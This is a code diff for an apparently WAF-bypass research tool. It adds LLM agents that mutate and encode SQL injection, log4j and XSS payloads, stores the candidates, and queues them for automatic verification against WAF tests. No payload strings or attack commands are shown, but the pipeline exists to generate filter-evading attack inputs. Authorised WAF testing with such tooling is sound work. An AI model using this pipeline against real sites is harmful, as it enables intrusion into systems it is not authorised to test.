@@ -21,6 +21,7 @@ from contextlib import asynccontextmanager
 from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any, Literal
+from urllib.parse import quote
 
 import httpx
 from dotenv import load_dotenv
@@ -36,6 +37,7 @@ from app.cross_iteration import (
 )
 from app.encoding_agent.encoding import (
     allowed_encoding_catalog,
+    realize_encoding_intent,
     validate_encoding_candidates,
 )
 from app.encoding_agent.prompts import (
@@ -67,6 +69,23 @@ from app.waf_testing import (
     run_xss_test,
     run_tencent_waf_test,
     tencent_waf_preflight,
+)
+from app.verification_agent.adapters import (
+    TargetEvidence,
+    resolve_adapter,
+    verification_targets,
+)
+from app.verification_agent.judge import (
+    build_judge_user_message,
+    is_unverifiable_payload,
+    normalize_verdict,
+    parse_verdict,
+)
+from app.verification_agent.prompts import build_judge_system_prompt
+from app.knowledge_base import (
+    TECHNIQUE_EXTRACT_SYSTEM_PROMPT,
+    parse_techniques,
+    technique_group,
 )
 
 PROJECT_ROOT = Path(__file__).resolve().parents[3]
@@ -127,9 +146,30 @@ ENCODING_AGENT_DOCUMENTS["prompt/encoding-iteration-agent"] = (
     "编码迭代 Agent 提示词",
     ENCODING_SYSTEM_PROMPT_PATH,
 )
+VERIFICATION_AGENT_DOCUMENTS: dict[str, tuple[str, str, Path]] = {
+    "prompt/verification-judge": (
+        "prompt",
+        "检验 Agent 判定提示词",
+        Path(__file__).resolve().parent / "verification_agent" / "prompt" / "verification_judge.md",
+    ),
+}
 
 DB_LOCK = threading.Lock()
 WAF_TEST_LOCK = threading.Lock()
+VERIFICATION_LOOP_STARTED = False
+VERIFICATION_LOOP_FLAG_LOCK = threading.Lock()
+
+
+def _verification_concurrency() -> int:
+    """读取受控并发上限（定义早于 _env_positive_int，避免导入期 NameError）。"""
+    try:
+        value = int(os.getenv("VERIFY_CONCURRENCY", "3").strip())
+    except (ValueError, AttributeError):
+        return 3
+    return value if value > 0 else 3
+
+
+VERIFICATION_SEMAPHORE = threading.Semaphore(_verification_concurrency())
 LOGGER = logging.getLogger("wafbypasser.api")
 DEFAULT_PAGE_SIZE = 50
 MAX_PAGE_SIZE = 100
@@ -141,9 +181,15 @@ VULNERABILITIES: set[str] = {
     "sql-injection",
     "log4j",
     "xss",
-    "tencent-waf",
 }
 CANDIDATE_STATUSES: set[str] = {"pending_test", "test_success", "test_failed", "rejected", "archived"}
+PAYLOAD_SEVERITIES: set[str] = {"低危", "中危", "高危", "严重"}
+
+
+def payload_internal_name(content: str) -> str:
+    """Return a stable internal label without requiring a user-supplied name."""
+    digest = hashlib.sha256(content.encode("utf-8")).hexdigest()[:12]
+    return f"Payload · {digest}"
 
 
 class IterationPoolAddRequest(BaseModel):
@@ -173,6 +219,21 @@ class IterationPoolStartRequest(BaseModel):
     candidate_count: int = Field(default=5, ge=1, le=20)
 
 
+class SemanticIterationRequest(BaseModel):
+    base_payload_id: str = Field(min_length=1)
+    candidate_count: int = Field(default=5, ge=1, le=20)
+
+
+class EncodingIterationRequest(BaseModel):
+    base_payload_id: str = Field(min_length=1)
+    candidate_count: int = Field(default=5, ge=1, le=20)
+
+
+class CrossIterationRequest(BaseModel):
+    cross_source_id: str = Field(min_length=1)
+    candidate_count: int = Field(default=5, ge=1, le=20)
+
+
 def utc_now() -> str:
     return datetime.now(timezone.utc).isoformat()
 
@@ -196,17 +257,39 @@ def _llm_config_complete(config: dict[str, str]) -> bool:
     return all(config.get(key, "").strip() for key in ("base_url", "api_key", "model"))
 
 
+def _env_bool(name: str, default: bool) -> bool:
+    value = os.getenv(name)
+    if value is None:
+        return default
+    normalized = value.strip().casefold()
+    if normalized in {"1", "true", "yes", "on"}:
+        return True
+    if normalized in {"0", "false", "no", "off"}:
+        return False
+    return default
+
+
+def _env_positive_int(name: str, default: int) -> int:
+    value = os.getenv(name)
+    if value is None:
+        return default
+    try:
+        parsed = int(value.strip())
+    except ValueError:
+        return default
+    return parsed if parsed > 0 else default
+
+
 def model_config() -> dict[str, str]:
     load_dotenv(CONFIG_PATH)
     return _llm_config("LLM", "OpenAI-compatible")
 
 
 def semantic_model_config() -> dict[str, str]:
-    """Prefer the dedicated semantic-agent provider, then fall back to LLM_*."""
-    load_dotenv(CONFIG_PATH)
-    semantic = _llm_config("SEMANTIC_LLM", "OpenAI-compatible")
-    if _llm_config_complete(semantic):
-        return semantic
+    """Resolve the LLM provider for both the semantic and encoding agents.
+
+    两个迭代 Agent 统一使用 `LLM_*` 配置（最初的通用 LLM 配置）。
+    """
     return model_config()
 
 
@@ -266,6 +349,39 @@ def _post_chat_completion(config: dict[str, str], messages: list[dict[str, str]]
     )
 
 
+def _post_semantic_batch(
+    config: dict[str, str],
+    messages: list[dict[str, str]],
+    batch_number: int,
+) -> httpx.Response:
+    max_retries = _env_positive_int("SEMANTIC_LLM_MAX_RETRIES", 2)
+    for attempt in range(max_retries + 1):
+        try:
+            response = _post_chat_completion(config, messages)
+        except httpx.TransportError:
+            if attempt >= max_retries:
+                raise
+            LOGGER.warning(
+                "Semantic LLM batch %s transport failure; retrying (%s/%s)",
+                batch_number,
+                attempt + 1,
+                max_retries,
+            )
+            time.sleep(min(2 ** attempt, 4))
+            continue
+        if response.status_code < 500 or attempt >= max_retries:
+            return response
+        LOGGER.warning(
+            "Semantic LLM batch %s returned HTTP %s; retrying (%s/%s)",
+            batch_number,
+            response.status_code,
+            attempt + 1,
+            max_retries,
+        )
+        time.sleep(min(2 ** attempt, 4))
+    raise RuntimeError("Semantic LLM retry loop ended unexpectedly")
+
+
 def _response_text(response: Any) -> str:
     try:
         return str(response.text or "")
@@ -310,64 +426,97 @@ def call_model(
     config = semantic_model_config()
     if not _llm_config_complete(config):
         raise RuntimeError("Semantic LLM configuration is incomplete; check config/.env")
-    messages = [
-        {"role": "system", "content": build_system_prompt(candidate_count)},
-        {
-            "role": "user",
-            "content": json.dumps(
-                {
-                    "base_payload": payload["content"],
-                    "vulnerability": payload["vulnerability"],
-                    "category": payload["category"],
-                    "delivery": payload["delivery"],
-                    "target": payload["target"],
-                    "rule_hints": rule_hints,
-                    "direction_context": direction_context_ or {},
-                    "candidate_count": candidate_count,
-                    "output_requirement": f"Return exactly {candidate_count} candidates.",
-                },
-                ensure_ascii=False,
-            ),
-        },
-    ]
-    response = _post_chat_completion(config, messages)
-    if _is_quota_error(response) and config.get("source") == "SEMANTIC_LLM":
-        legacy = model_config()
-        if _llm_config_complete(legacy) and not _same_llm_config(config, legacy):
-            LOGGER.warning("Semantic LLM quota exhausted; retrying once with legacy LLM provider")
-            try:
-                response = _post_chat_completion(legacy, messages)
-            except Exception as fallback_error:
-                raise RuntimeError(
-                    f"Semantic LLM quota exhausted and legacy LLM fallback failed: {fallback_error}"
-                ) from fallback_error
-    response.raise_for_status()
-    message = response.json()["choices"][0]["message"]["content"] or ""
+    batch_size = min(
+        candidate_count,
+        _env_positive_int("SEMANTIC_LLM_BATCH_SIZE", candidate_count),
+    )
+    all_candidates: list[dict[str, Any]] = []
 
-    decoded = _extract_json_payload(message)
-    if decoded is None:
-        preview = (message[:500] + "…") if len(message) > 500 else message
-        raise ValueError(
-            f"模型返回的内容无法解析为JSON\n预览: {preview or '<空响应>'}"
-        )
+    for offset in range(0, candidate_count, batch_size):
+        current_count = min(batch_size, candidate_count - offset)
+        batch_context = dict(direction_context_ or {})
+        directions = list(batch_context.get("available_directions", []))
+        if directions:
+            shift = offset % len(directions)
+            batch_context["available_directions"] = directions[shift:] + directions[:shift]
+        batch_hints = list(rule_hints)
+        if batch_hints:
+            shift = offset % len(batch_hints)
+            batch_hints = batch_hints[shift:] + batch_hints[:shift]
 
-    if isinstance(decoded, dict):
-        candidates = decoded.get("candidates")
-        if candidates is None:
-            # Some models return a single candidate object directly
-            candidates = [decoded] if decoded.get("part_operations") else None
-    else:
-        candidates = decoded
+        messages = [
+            {
+                "role": "system",
+                "content": build_system_prompt(current_count, payload["vulnerability"]),
+            },
+            {
+                "role": "user",
+                "content": json.dumps(
+                    {
+                        "base_payload": payload["content"],
+                        "vulnerability": payload["vulnerability"],
+                        "category": payload["category"],
+                        "delivery": payload["delivery"],
+                        "target": payload["target"],
+                        "rule_hints": batch_hints,
+                        "direction_context": batch_context,
+                        "candidate_count": current_count,
+                        "output_requirement": f"Return exactly {current_count} candidates.",
+                    },
+                    ensure_ascii=False,
+                ),
+            },
+        ]
+        batch_number = offset // batch_size + 1
+        response = _post_semantic_batch(config, messages, batch_number)
+        if (
+            _is_quota_error(response)
+            and config.get("source") == "SEMANTIC_LLM"
+            and _env_bool("SEMANTIC_LLM_ALLOW_FALLBACK", True)
+        ):
+            legacy = model_config()
+            if _llm_config_complete(legacy) and not _same_llm_config(config, legacy):
+                LOGGER.warning("Semantic LLM quota exhausted; retrying once with legacy LLM provider")
+                try:
+                    response = _post_chat_completion(legacy, messages)
+                except Exception as fallback_error:
+                    raise RuntimeError(
+                        f"Semantic LLM quota exhausted and legacy LLM fallback failed: {fallback_error}"
+                    ) from fallback_error
+        try:
+            response.raise_for_status()
+        except httpx.HTTPStatusError as error:
+            body = _response_text(response).strip()
+            preview = body[:1000] if body else "<empty response>"
+            raise RuntimeError(
+                f"Semantic LLM batch {batch_number} failed with HTTP "
+                f"{response.status_code}: {preview}"
+            ) from error
+        message = response.json()["choices"][0]["message"]["content"] or ""
 
-    if not isinstance(candidates, list):
-        raise ValueError("模型响应中未找到 candidates 数组")
+        decoded = _extract_json_payload(message)
+        if decoded is None:
+            preview = (message[:500] + "…") if len(message) > 500 else message
+            raise ValueError(
+                f"模型返回的内容无法解析为JSON\n预览: {preview or '<空响应>'}"
+            )
 
-    # 只保留 dict 类型的候选，其他跳过（而不是让整个任务失败）
-    valid_candidates = [c for c in candidates if isinstance(c, dict)]
-    if not valid_candidates:
-        raise ValueError("模型返回的候选均无效（非对象格式）")
+        if isinstance(decoded, dict):
+            candidates = decoded.get("candidates")
+            if candidates is None:
+                candidates = [decoded] if decoded.get("part_operations") else None
+        else:
+            candidates = decoded
 
-    return valid_candidates[:candidate_count] if len(valid_candidates) > candidate_count else valid_candidates
+        if not isinstance(candidates, list):
+            raise ValueError("模型响应中未找到 candidates 数组")
+
+        valid_candidates = [c for c in candidates if isinstance(c, dict)]
+        if not valid_candidates:
+            raise ValueError("模型返回的候选均无效（非对象格式）")
+        all_candidates.extend(valid_candidates[:current_count])
+
+    return all_candidates[:candidate_count]
 
 
 def _existing_candidate_contents(vulnerability: str, base_payload_id: str) -> set[str]:
@@ -658,6 +807,7 @@ def run_semantic_generation(task_id: str) -> None:
         with DB_LOCK:
             connection = sqlite3.connect(DB_PATH)
             for candidate in candidates:
+                candidate_id = str(uuid.uuid4())
                 connection.execute(
                     """
                     INSERT INTO candidates (
@@ -670,7 +820,7 @@ def run_semantic_generation(task_id: str) -> None:
                     ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'pending_test', NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                     """,
                     (
-                        str(uuid.uuid4()), task_id, payload["id"], candidate["content"],
+                        candidate_id, task_id, payload["id"], candidate["content"],
                         payload["delivery"], json.dumps(candidate["rule_labels"], ensure_ascii=False),
                         candidate["explanation"], candidate["confidence"], timestamp, timestamp,
                         json.dumps(candidate["direction_ids"], ensure_ascii=False),
@@ -686,6 +836,16 @@ def run_semantic_generation(task_id: str) -> None:
                         task.get("unsupported_reason"),
                     ),
                 )
+                # 自动路由到检验 Agent
+                enqueue_verification(
+                    connection,
+                    "semantic",
+                    candidate_id,
+                    "candidates",
+                    payload,
+                    candidate["content"],
+                    payload["delivery"],
+                )
             if warning_message:
                 connection.execute(
                     "UPDATE generation_tasks SET status = 'completed', completed_at = ?, error_message = ? WHERE id = ?",
@@ -698,6 +858,7 @@ def run_semantic_generation(task_id: str) -> None:
                 )
             connection.commit()
             connection.close()
+        _start_verification_loop()
     except Exception as error:
         with DB_LOCK:
             connection = sqlite3.connect(DB_PATH)
@@ -713,46 +874,860 @@ def run_semantic_generation(task_id: str) -> None:
             connection.close()
 
 
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    """Initialize database and resources on startup."""
-    load_dotenv(CONFIG_PATH)
+def call_encoding_model(
+    payload: dict[str, Any],
+    candidate_count: int,
+    direction_context_: dict[str, Any] | None = None,
+) -> list[dict[str, Any]]:
+    """Call the LLM to produce `candidate_count` encoding candidates.
+
+    Uses the same provider resolution as the semantic agent (dedicated
+    provider first, then legacy fallback). Returned candidates are validated
+    against the 28-encoding catalog in `run_encoding_generation`.
+    """
+    config = semantic_model_config()
+    if not _llm_config_complete(config):
+        raise RuntimeError("Semantic LLM configuration is incomplete; check config/.env")
+
+    allowed = allowed_encoding_catalog(payload["vulnerability"], payload["content"])
+    system_prompt = build_encoding_system_prompt(candidate_count)
+    user_body = {
+        "base_payload": payload["content"],
+        "vulnerability": payload["vulnerability"],
+        "category": payload.get("category", ""),
+        "delivery": payload.get("delivery", ""),
+        "target": payload.get("target", ""),
+        "allowed_encodings": allowed,
+        "direction_context": direction_context_ or {},
+        "candidate_count": candidate_count,
+        "output_requirement": f"Return exactly {candidate_count} candidates.",
+    }
+    messages = [
+        {"role": "system", "content": system_prompt},
+        {"role": "user", "content": json.dumps(user_body, ensure_ascii=False)},
+    ]
+
+    response = _post_chat_completion(config, messages)
+    if (
+        _is_quota_error(response)
+        and config.get("source") == "SEMANTIC_LLM"
+        and _env_bool("SEMANTIC_LLM_ALLOW_FALLBACK", True)
+    ):
+        legacy = model_config()
+        if _llm_config_complete(legacy) and not _same_llm_config(config, legacy):
+            LOGGER.warning("Semantic LLM quota exhausted; retrying once with legacy LLM provider")
+            response = _post_chat_completion(legacy, messages)
+
+    try:
+        response.raise_for_status()
+    except httpx.HTTPStatusError as error:
+        body = _response_text(response).strip()
+        preview = body[:1000] if body else "<empty response>"
+        raise RuntimeError(
+            f"Encoding LLM failed with HTTP {response.status_code}: {preview}"
+        ) from error
+
+    message = response.json()["choices"][0]["message"]["content"] or ""
+    decoded = _extract_json_payload(message)
+    if decoded is None:
+        preview = (message[:500] + "…") if len(message) > 500 else message
+        raise ValueError(f"模型返回的内容无法解析为JSON\n预览: {preview or '<空响应>'}")
+
+    if isinstance(decoded, dict):
+        candidates = decoded.get("candidates")
+    else:
+        candidates = decoded
+    if not isinstance(candidates, list):
+        raise ValueError("模型响应中未找到 candidates 数组")
+
+    valid_candidates = [c for c in candidates if isinstance(c, dict)]
+    if not valid_candidates:
+        raise ValueError("模型返回的候选均无效（非对象格式）")
+    return valid_candidates[:candidate_count]
+
+
+def run_encoding_generation(task_id: str) -> None:
+    """Background task: generate, validate, and persist encoding candidates."""
+    try:
+        with DB_LOCK:
+            connection = connect()
+            task_record = connection.execute(
+                "SELECT * FROM encoding_tasks WHERE id = ?", (task_id,)
+            ).fetchone()
+            if not task_record:
+                connection.close()
+                return
+            task = dict(task_record)
+            payload = read_payload(connection, task["base_payload_id"])
+            if not payload:
+                raise ValueError("Base Payload not found")
+            connection.execute(
+                "UPDATE encoding_tasks SET status = 'running' WHERE id = ?", (task_id,)
+            )
+            connection.commit()
+            connection.close()
+
+        direction_context = json_value(task.get("direction_context_json"), {})
+        raw_candidates = call_encoding_model(
+            payload, task["candidate_count"], direction_context
+        )
+        # LLM 只输出「编码意图」，后端确定性生成 content + segs。
+        validated: list[dict[str, Any]] = []
+        seen_contents: set[str] = set()
+        for intent in raw_candidates:
+            for candidate in realize_encoding_intent(
+                payload["content"], intent, payload["vulnerability"]
+            ):
+                if candidate["content"] in seen_contents:
+                    continue
+                seen_contents.add(candidate["content"])
+                validated.append(candidate)
+                if len(validated) >= task["candidate_count"]:
+                    break
+            if len(validated) >= task["candidate_count"]:
+                break
+        if not validated:
+            raise ValueError("所有编码意图均未能生成有效候选")
+
+        timestamp = utc_now()
+        with DB_LOCK:
+            connection = connect()
+            for candidate in validated:
+                candidate_id = str(uuid.uuid4())
+                connection.execute(
+                    """
+                    INSERT INTO encoding_candidates (
+                        id, task_id, base_payload_id, content, delivery,
+                        encoding_chain_json, decode_path_json, rule_labels_json,
+                        explanation, confidence, status, test_note, created_at,
+                        updated_at, origin, used_direction_ids_json,
+                        next_directions_json
+                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending_test', NULL, ?, ?, 'generated', '[]', '[]')
+                    """,
+                    (
+                        candidate_id,
+                        task_id,
+                        payload["id"],
+                        candidate["content"],
+                        payload["delivery"],
+                        json.dumps(candidate["encoding_chain"], ensure_ascii=False),
+                        json.dumps(candidate["decode_path"], ensure_ascii=False),
+                        json.dumps(candidate["rule_labels"], ensure_ascii=False),
+                        candidate["explanation"],
+                        candidate["confidence"],
+                        timestamp,
+                        timestamp,
+                    ),
+                )
+                # 自动路由到检验 Agent
+                enqueue_verification(
+                    connection,
+                    "encoding",
+                    candidate_id,
+                    "encoding_candidates",
+                    payload,
+                    candidate["content"],
+                    payload["delivery"],
+                )
+            connection.execute(
+                "UPDATE encoding_tasks SET status = 'completed', completed_at = ?, error_message = NULL WHERE id = ?",
+                (timestamp, task_id),
+            )
+            connection.commit()
+            connection.close()
+        _start_verification_loop()
+    except Exception as error:
+        with DB_LOCK:
+            connection = connect()
+            connection.execute(
+                "UPDATE encoding_tasks SET status = 'failed', error_message = ?, completed_at = ? WHERE id = ?",
+                (str(error)[:1000], utc_now(), task_id),
+            )
+            connection.commit()
+            connection.close()
+
+
+def run_cross_generation(task_id: str) -> None:
+    """后台任务：对语义输出（cross_source）用编码 agent（LLM）做编码叠加，落库并自动入队检验。"""
+    try:
+        with DB_LOCK:
+            connection = connect()
+            task_record = connection.execute(
+                "SELECT * FROM cross_tasks WHERE id = ?", (task_id,)
+            ).fetchone()
+            if not task_record:
+                connection.close()
+                return
+            task = dict(task_record)
+            source_record = connection.execute(
+                "SELECT * FROM cross_sources WHERE id = ?", (task["cross_source_id"],)
+            ).fetchone()
+            if not source_record:
+                raise ValueError("Cross iteration source not found")
+            source = dict(source_record)
+            connection.execute(
+                "UPDATE cross_tasks SET status = 'running' WHERE id = ?", (task_id,)
+            )
+            connection.commit()
+            connection.close()
+
+        used_chain_keys = {
+            entry["chain_key"]
+            for entry in db_rows(
+                "SELECT chain_key FROM cross_chain_history WHERE cross_source_id = ?",
+                (source["id"],),
+            )
+        }
+
+        # 构造 payload 供编码 agent 使用（语义源已是语义变异后的归档结果）
+        payload = {
+            "content": source["content"],
+            "vulnerability": source["vulnerability"],
+            "delivery": source["delivery"],
+            "category": source.get("category") or "",
+            "target": source.get("target") or "",
+            "difficulty": source.get("difficulty") or "",
+        }
+        raw_candidates = call_encoding_model(payload, task["candidate_count"])
+        # LLM 只输出「编码意图」，后端确定性生成 content + segs。
+        validated: list[dict[str, Any]] = []
+        seen_contents: set[str] = set()
+        for intent in raw_candidates:
+            for candidate in realize_encoding_intent(
+                source["content"], intent, source["vulnerability"]
+            ):
+                if candidate["content"] in seen_contents:
+                    continue
+                seen_contents.add(candidate["content"])
+                validated.append(candidate)
+                if len(validated) >= task["candidate_count"]:
+                    break
+            if len(validated) >= task["candidate_count"]:
+                break
+        if not validated:
+            raise ValueError("所有编码意图均未能生成有效候选")
+
+        timestamp = utc_now()
+        inserted = 0
+        with DB_LOCK:
+            connection = connect()
+            for candidate in validated:
+                chain_key = encoding_chain_key(candidate["encoding_chain"])
+                if chain_key in used_chain_keys:
+                    continue
+                candidate_id = str(uuid.uuid4())
+                connection.execute(
+                    """
+                    INSERT INTO cross_candidates (
+                        id, task_id, cross_source_id, content, encoding_chain_json,
+                        decode_path_json, rule_labels_json, status, test_note,
+                        created_at, updated_at
+                    ) VALUES (?, ?, ?, ?, ?, ?, ?, 'pending_test', NULL, ?, ?)
+                    """,
+                    (
+                        candidate_id,
+                        task_id,
+                        source["id"],
+                        candidate["content"],
+                        json.dumps(candidate["encoding_chain"], ensure_ascii=False),
+                        json.dumps(candidate["decode_path"], ensure_ascii=False),
+                        json.dumps(candidate["rule_labels"], ensure_ascii=False),
+                        timestamp,
+                        timestamp,
+                    ),
+                )
+                connection.execute(
+                    """
+                    INSERT OR IGNORE INTO cross_chain_history (
+                        cross_source_id, chain_key, content, created_at
+                    ) VALUES (?, ?, ?, ?)
+                    """,
+                    (
+                        source["id"],
+                        chain_key,
+                        candidate["content"],
+                        timestamp,
+                    ),
+                )
+                used_chain_keys.add(chain_key)
+                enqueue_verification(
+                    connection,
+                    "cross",
+                    candidate_id,
+                    "cross_candidates",
+                    source,
+                    candidate["content"],
+                    source["delivery"],
+                )
+                inserted += 1
+            connection.execute(
+                "UPDATE cross_tasks SET status = 'completed', completed_at = ?, error_message = NULL WHERE id = ?",
+                (timestamp, task_id),
+            )
+            connection.commit()
+            connection.close()
+        _start_verification_loop()
+    except Exception as error:
+        with DB_LOCK:
+            connection = connect()
+            connection.execute(
+                "UPDATE cross_tasks SET status = 'failed', error_message = ?, completed_at = ? WHERE id = ?",
+                (str(error)[:1000], utc_now(), task_id),
+            )
+            connection.commit()
+            connection.close()
+
+
+# ---------------------------------------------------------------------------
+# 数据库连接 / 行转换 / 时间戳 / 读取辅助函数
+# ---------------------------------------------------------------------------
+
+
+def now() -> str:
+    return utc_now()
+
+
+def connect() -> sqlite3.Connection:
+    """Create a row-factory connection with foreign keys enabled (context-managed)."""
+    connection = sqlite3.connect(DB_PATH, timeout=10)
+    connection.row_factory = sqlite3.Row
+    connection.execute("PRAGMA foreign_keys = ON")
+    connection.execute("PRAGMA busy_timeout = 5000")
+    return connection
+
+
+def row(record: Any) -> dict[str, Any] | None:
+    """Convert a single sqlite3.Row (or None) into a dict."""
+    return dict(record) if record is not None else None
+
+
+def read_payload(connection: sqlite3.Connection, payload_id: str) -> dict[str, Any] | None:
+    record = connection.execute("SELECT * FROM payloads WHERE id = ?", (payload_id,)).fetchone()
+    return dict(record) if record else None
+
+
+def _ensure_columns(
+    connection: sqlite3.Connection,
+    table: str,
+    columns: list[tuple[str, str]],
+) -> None:
+    """Add any missing columns (idempotent) so legacy tables match the full schema."""
+    existing = {
+        col[1]
+        for col in connection.execute(f"PRAGMA table_info({table})")
+    }
+    for name, ddl in columns:
+        if name not in existing:
+            connection.execute(f"ALTER TABLE {table} ADD COLUMN {name} {ddl}")
+
+
+def initialize_database() -> None:
+    """Create the full schema and migrate legacy tables to the current shape."""
     DB_PATH.parent.mkdir(parents=True, exist_ok=True)
     REPORT_EVIDENCE_ROOT.mkdir(parents=True, exist_ok=True)
 
     with DB_LOCK:
-        conn = sqlite3.connect(DB_PATH)
-        conn.execute("PRAGMA journal_mode=WAL")
-        conn.execute("PRAGMA busy_timeout=5000")
-        conn.execute("""
+        connection = sqlite3.connect(DB_PATH)
+        connection.execute("PRAGMA journal_mode=WAL")
+        connection.execute("PRAGMA busy_timeout=5000")
+
+        connection.executescript(
+            """
             CREATE TABLE IF NOT EXISTS payloads (
                 id TEXT PRIMARY KEY,
+                name TEXT NOT NULL,
                 vulnerability TEXT NOT NULL,
-                payload TEXT NOT NULL,
+                category TEXT NOT NULL,
+                delivery TEXT NOT NULL,
+                target TEXT NOT NULL,
+                difficulty TEXT NOT NULL,
+                content TEXT NOT NULL,
+                created_at TEXT NOT NULL,
+                archived_from_candidate_id TEXT UNIQUE,
+                source_agent TEXT,
+                source_candidate_id TEXT,
+                iteration_metadata_json TEXT,
+                is_pool_snapshot INTEGER NOT NULL DEFAULT 0,
+                severity TEXT NOT NULL DEFAULT '中危',
+                is_executable INTEGER NOT NULL DEFAULT 1,
+                usage_method TEXT NOT NULL DEFAULT '',
+                success_indicators TEXT NOT NULL DEFAULT '',
+                is_deleted INTEGER NOT NULL DEFAULT 0
+            );
+            CREATE TABLE IF NOT EXISTS generation_tasks (
+                id TEXT PRIMARY KEY,
+                base_payload_id TEXT NOT NULL,
                 status TEXT NOT NULL,
+                provider TEXT,
+                model TEXT,
+                rule_hints_json TEXT NOT NULL,
+                error_message TEXT,
+                created_at TEXT NOT NULL,
+                completed_at TEXT,
+                candidate_count INTEGER NOT NULL DEFAULT 5,
+                direction_context_json TEXT NOT NULL DEFAULT '{}',
+                base_parts_json TEXT NOT NULL DEFAULT '[]',
+                parser_confidence REAL NOT NULL DEFAULT 0,
+                parser_status TEXT NOT NULL DEFAULT 'unsupported',
+                unsupported_reason TEXT
+            );
+            CREATE TABLE IF NOT EXISTS candidates (
+                id TEXT PRIMARY KEY,
+                task_id TEXT NOT NULL,
+                base_payload_id TEXT NOT NULL,
+                content TEXT NOT NULL,
+                delivery TEXT NOT NULL,
+                rule_labels_json TEXT NOT NULL,
+                explanation TEXT NOT NULL,
+                confidence REAL NOT NULL,
+                status TEXT NOT NULL,
+                test_note TEXT,
+                created_at TEXT NOT NULL,
+                updated_at TEXT NOT NULL,
+                used_direction_ids_json TEXT NOT NULL DEFAULT '[]',
+                next_directions_json TEXT NOT NULL DEFAULT '[]',
+                execution_goal_id TEXT,
+                semantic_dimension_ids_json TEXT NOT NULL DEFAULT '[]',
+                semantic_delta_json TEXT NOT NULL DEFAULT '{}',
+                verification_spec_json TEXT,
+                base_parts_json TEXT NOT NULL DEFAULT '[]',
+                candidate_parts_json TEXT NOT NULL DEFAULT '[]',
+                part_operations_json TEXT NOT NULL DEFAULT '[]',
+                parser_confidence TEXT NOT NULL DEFAULT '0',
+                parser_status TEXT NOT NULL DEFAULT 'unsupported',
+                unsupported_reason TEXT
+            );
+            CREATE TABLE IF NOT EXISTS encoding_tasks (
+                id TEXT PRIMARY KEY,
+                base_payload_id TEXT NOT NULL,
+                status TEXT NOT NULL,
+                provider TEXT,
+                model TEXT,
+                candidate_count INTEGER NOT NULL DEFAULT 5,
+                error_message TEXT,
+                created_at TEXT NOT NULL,
+                completed_at TEXT,
+                direction_context_json TEXT NOT NULL DEFAULT '{}'
+            );
+            CREATE TABLE IF NOT EXISTS encoding_candidates (
+                id TEXT PRIMARY KEY,
+                task_id TEXT NOT NULL,
+                base_payload_id TEXT NOT NULL,
+                content TEXT NOT NULL,
+                delivery TEXT NOT NULL,
+                encoding_chain_json TEXT NOT NULL,
+                decode_path_json TEXT NOT NULL,
+                rule_labels_json TEXT NOT NULL,
+                explanation TEXT NOT NULL,
+                confidence REAL NOT NULL,
+                status TEXT NOT NULL,
+                test_note TEXT,
+                created_at TEXT NOT NULL,
+                updated_at TEXT NOT NULL,
+                origin TEXT NOT NULL DEFAULT 'generated',
+                migration_note TEXT,
+                migrated_from_candidate_id TEXT,
+                used_direction_ids_json TEXT NOT NULL DEFAULT '[]',
+                next_directions_json TEXT NOT NULL DEFAULT '[]'
+            );
+            CREATE TABLE IF NOT EXISTS cross_sources (
+                id TEXT PRIMARY KEY,
+                archived_payload_id TEXT NOT NULL UNIQUE,
+                semantic_candidate_id TEXT NOT NULL UNIQUE,
+                name TEXT NOT NULL,
+                vulnerability TEXT NOT NULL,
+                category TEXT NOT NULL,
+                delivery TEXT NOT NULL,
+                target TEXT NOT NULL,
+                difficulty TEXT NOT NULL,
+                content TEXT NOT NULL,
+                rule_labels_json TEXT NOT NULL,
+                created_at TEXT NOT NULL
+            );
+            CREATE TABLE IF NOT EXISTS cross_tasks (
+                id TEXT PRIMARY KEY,
+                cross_source_id TEXT NOT NULL,
+                status TEXT NOT NULL,
+                candidate_count INTEGER NOT NULL,
+                error_message TEXT,
+                created_at TEXT NOT NULL,
+                completed_at TEXT
+            );
+            CREATE TABLE IF NOT EXISTS cross_candidates (
+                id TEXT PRIMARY KEY,
+                task_id TEXT NOT NULL,
+                cross_source_id TEXT NOT NULL,
+                content TEXT NOT NULL,
+                encoding_chain_json TEXT NOT NULL,
+                decode_path_json TEXT NOT NULL,
+                rule_labels_json TEXT NOT NULL,
+                status TEXT NOT NULL,
+                test_note TEXT,
                 created_at TEXT NOT NULL,
                 updated_at TEXT NOT NULL
-            )
-        """)
-        # Existing installations own the full schema.  Fresh legacy databases
-        # may only have payloads at this point, so index only existing tables.
-        tables = {
-            row[0]
-            for row in conn.execute("SELECT name FROM sqlite_master WHERE type = 'table'")
-        }
-        if "waf_test_runs" in tables:
-            conn.execute(
-                "CREATE INDEX IF NOT EXISTS idx_waf_test_runs_candidate_latest "
-                "ON waf_test_runs(agent, candidate_id, created_at DESC)"
-            )
-        if "success_samples" in tables:
-            conn.execute(
-                "CREATE INDEX IF NOT EXISTS idx_success_samples_active_created "
-                "ON success_samples(status, created_at DESC)"
-            )
-        conn.commit()
-        conn.close()
+            );
+            CREATE TABLE IF NOT EXISTS cross_chain_history (
+                cross_source_id TEXT NOT NULL,
+                chain_key TEXT NOT NULL,
+                content TEXT NOT NULL,
+                created_at TEXT NOT NULL,
+                PRIMARY KEY (cross_source_id, chain_key),
+                UNIQUE (cross_source_id, content)
+            );
+            CREATE TABLE IF NOT EXISTS iteration_pool_items (
+                id TEXT PRIMARY KEY,
+                agent TEXT NOT NULL CHECK(agent IN ('semantic', 'encoding')),
+                source_payload_id TEXT NOT NULL,
+                snapshot_payload_id TEXT NOT NULL UNIQUE,
+                status TEXT NOT NULL CHECK(status IN ('pending', 'started')),
+                task_id TEXT,
+                created_at TEXT NOT NULL,
+                started_at TEXT
+            );
+            CREATE TABLE IF NOT EXISTS success_samples (
+                id TEXT PRIMARY KEY,
+                agent TEXT NOT NULL,
+                candidate_id TEXT NOT NULL,
+                archived_payload_id TEXT,
+                name TEXT NOT NULL,
+                vulnerability TEXT NOT NULL,
+                category TEXT NOT NULL,
+                delivery TEXT NOT NULL,
+                target TEXT NOT NULL,
+                difficulty TEXT NOT NULL,
+                content TEXT NOT NULL,
+                test_note TEXT,
+                provenance_json TEXT NOT NULL,
+                status TEXT NOT NULL,
+                created_at TEXT NOT NULL,
+                updated_at TEXT NOT NULL,
+                UNIQUE (agent, candidate_id)
+            );
